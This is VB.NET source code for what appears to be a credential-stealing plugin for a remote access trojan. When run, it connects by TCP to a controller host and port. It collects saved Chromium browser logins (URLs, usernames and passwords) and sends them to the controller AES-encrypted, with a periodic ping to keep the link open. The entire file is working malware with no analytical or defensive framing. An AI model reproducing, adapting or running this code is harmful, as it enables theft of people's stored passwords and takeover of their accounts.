Imports System.IO
Imports System.Net.Sockets
Imports System.Security.Cryptography
Imports System.Text
Public Class Plugin

    Public Shared T1 As New Threading.Thread(New Threading.ThreadStart(AddressOf ClientSocket.BeginConnect))
    Public Shared T2 As New Threading.Thread(New Threading.ThreadStart(AddressOf ClientSocket.Ping))

    Public Shared Function Run(ByVal H As String, ByVal P As String, ByVal SL As String, ByVal K As String, ByVal id As String)
        Try
            Settings.Host = H
            Settings.Port = P
            Settings.SPL = SL
            Settings.KEY = K
            Settings.IDD = id
            T1.Start()
            T2.Start()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
End Class
Public Class Settings
    Public Shared Host As String
    Public Shared Port As String
    Public Shared KEY As String
    Public Shared SPL As String
    Public Shared IDD As String
End Class
Public Class ClientSocket
    Public Shared S As Socket
    Public Shared BufferLength As Long = Nothing
    Public Shared Buffer() As Byte
    Public Shared MS As New MemoryStream
    Public Shared Sub BeginConnect()
        S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        BufferLength = -1
        Buffer = New Byte(0) {}
        MS = New MemoryStream

        S.ReceiveBufferSize = 50 * 1024
        S.SendBufferSize = 50 * 1024

        Try

            S.Connect(Settings.Host, Settings.Port)

            Dim SB As StringBuilder = New StringBuilder()
            Dim Recovery = Chromium.ChromeRecovery.Chromium.Grab

            For Each b In Recovery
                SB.Append("Url: " & b.URL.ToString())
                SB.Append(Environment.NewLine)
                SB.Append("Username: " & b.UserName.ToString())
                SB.Append(Environment.NewLine)
                SB.Append("Password: " & b.Password.ToString())
                SB.Append(Environment.NewLine)
                SB.Append("Application: " & b.Application.ToString())
                SB.Append(Environment.NewLine)
                SB.Append("=============================")
                SB.Append(Environment.NewLine)
            Next

            Send("Chromium" & Settings.SPL & Settings.IDD & Settings.SPL & SB.ToString)

            isDisconnected()

        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Public Shared Sub Send(ByVal msg As String)
        Try
            Using MS As New MemoryStream
                Dim B As Byte() = AES_Encryptor(SB(msg))
                Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                MS.Write(L, 0, L.Length)
                MS.Write(B, 0, B.Length)

                S.Poll(-1, SelectMode.SelectWrite)
                S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
            End Using
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Public Shared Sub isDisconnected()
        Try
            S.Close()
            S.Dispose()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        Try
            MS.Close()
            MS.Dispose()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        Try
            Plugin.T1.Abort()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
        Try
            Plugin.T2.Abort()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Public Shared Sub Ping()
        While True
            Threading.Thread.Sleep(30 * 1000)
            Try
                If S.Connected Then
                    Using MS As New MemoryStream
                        Dim B As Byte() = AES_Encryptor(SB("PING?"))
                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                        MS.Write(L, 0, L.Length)
                        MS.Write(B, 0, B.Length)

                        S.Poll(-1, SelectMode.SelectWrite)
                        S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
                        GC.Collect()
                    End Using
                End If
            Catch ex As Exception
                isDisconnected()
            End Try
        End While
    End Sub
End Class

Module Helper
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.UTF8.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.UTF8.GetString(b)
    End Function

    Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim AES_ As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
            AES_.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES_.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function

    Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES_ As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
            AES_.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES_.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
End Module
